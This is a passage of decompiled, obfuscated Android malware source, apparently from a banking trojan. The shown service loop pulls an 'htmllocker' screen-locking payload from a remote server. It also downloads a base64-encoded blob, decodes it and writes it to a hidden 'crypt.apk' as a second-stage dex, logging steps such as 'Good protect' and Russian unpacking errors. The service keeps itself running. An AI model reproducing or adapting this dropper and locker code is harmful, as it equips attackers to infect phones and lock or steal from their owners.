            java.lang.String r7 = r7.mo218b(r8, r9, r10)     // Catch:{ Exception -> 0x0fb5 }
            java.lang.String r5 = r5.mo230d(r7)     // Catch:{ Exception -> 0x0fb5 }
            int r7 = r5.length()     // Catch:{ Exception -> 0x0fb5 }
            if (r7 <= r6) goto L_0x0fbe
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b     // Catch:{ Exception -> 0x0fb5 }
            android.content.Context r7 = r1.f573d     // Catch:{ Exception -> 0x0fb5 }
            java.lang.String r8 = "htmllocker"
            r6.mo233d(r7, r8, r5)     // Catch:{ Exception -> 0x0fb5 }
            goto L_0x0fbe
        L_0x0fb5:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r7 = "ERROR -> htmllocker"
            r5.mo213a(r6, r7)
        L_0x0fbe:
            wocwvy.czyxoxmbauu.slsa.c r5 = r1.f570a
            boolean r5 = r5.f390q
            if (r5 == 0) goto L_0x1050
            java.io.File r5 = new java.io.File     // Catch:{ Exception -> 0x1044 }
            java.lang.String r6 = "apk"
            r7 = 0
            java.io.File r6 = r1.getDir(r6, r7)     // Catch:{ Exception -> 0x1045 }
            java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x1044 }
            r7.<init>()     // Catch:{ Exception -> 0x1044 }
            wocwvy.czyxoxmbauu.slsa.c r8 = r1.f570a     // Catch:{ Exception -> 0x1044 }
            r8.getClass()     // Catch:{ Exception -> 0x1044 }
            java.lang.String r8 = "crypt"
            r7.append(r8)     // Catch:{ Exception -> 0x1044 }
            java.lang.String r8 = ".apk"
            r7.append(r8)     // Catch:{ Exception -> 0x1044 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x1044 }
            r5.<init>(r6, r7)     // Catch:{ Exception -> 0x1044 }
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b     // Catch:{ Exception -> 0x1044 }
            java.lang.String r7 = "ukhakhcgifofl"
            java.lang.String r8 = "Good protect 1"
            r6.mo213a(r7, r8)     // Catch:{ Exception -> 0x1044 }
            boolean r6 = r5.exists()     // Catch:{ Exception -> 0x1044 }
            if (r6 != 0) goto L_0x1050
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b     // Catch:{ Exception -> 0x1044 }
            java.lang.String r7 = "ukhakhcgifofl"
            java.lang.String r8 = "Good protect 2"
            r6.mo213a(r7, r8)     // Catch:{ Exception -> 0x1044 }
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f571b     // Catch:{ Exception -> 0x1044 }
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f571b     // Catch:{ Exception -> 0x1044 }
            android.content.Context r8 = r1.f573d     // Catch:{ Exception -> 0x1044 }
            java.lang.String r9 = "14"
            java.lang.String r10 = "p=1"
            java.lang.String r7 = r7.mo218b(r8, r9, r10)     // Catch:{ Exception -> 0x1044 }
            java.lang.String r6 = r6.mo230d(r7)     // Catch:{ Exception -> 0x1044 }
            int r7 = r6.length()     // Catch:{ Exception -> 0x1044 }
            r8 = 1000(0x3e8, float:1.401E-42)
            if (r7 <= r8) goto L_0x1050
            byte[] r6 = r6.getBytes()     // Catch:{ Exception -> 0x1044 }
            r7 = 0
            byte[] r6 = android.util.Base64.decode(r6, r7)     // Catch:{ Exception -> 0x1045 }
            java.io.FileOutputStream r8 = new java.io.FileOutputStream     // Catch:{ Exception -> 0x1039 }
            r9 = 1
            r8.<init>(r5, r9)     // Catch:{ Exception -> 0x103a }
            r8.write(r6)     // Catch:{ Exception -> 0x103a }
            r8.close()     // Catch:{ Exception -> 0x103a }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x103a }
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r8 = "Good protect 3"
            r5.mo213a(r6, r8)     // Catch:{ Exception -> 0x103a }
            goto L_0x1052
        L_0x1039:
            r9 = 1
        L_0x103a:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b     // Catch:{ Exception -> 0x1046 }
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r8 = "Распаковка декса ERROR"
            r5.mo213a(r6, r8)     // Catch:{ Exception -> 0x1046 }
            goto L_0x1052
        L_0x1044:
            r7 = 0
        L_0x1045:
            r9 = 1
        L_0x1046:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r6 = "ukhakhcgifofl"
            java.lang.String r8 = "ERROR -> декс"
            r5.mo213a(r6, r8)
            goto L_0x1052
        L_0x1050:
            r7 = 0
            r9 = 1
        L_0x1052:
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f571b
            java.lang.String r6 = "ServiceComm"
            r5.mo209a(r1, r6)
            int r4 = r4 + 1
            goto L_0x064c
        L_0x105d:
            r18.stopSelf()
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl.mo451a():void");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public void mo452b(String str) {
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            bufferedWriter.write("");
            bufferedWriter.close();
        } catch (IOException unused) {
        }
    }

    public void onCreate() {
        super.onCreate();
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        this.f573d = this;
        mo451a();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        super.onStartCommand(intent, i, i2);
        return 1;
    }
}
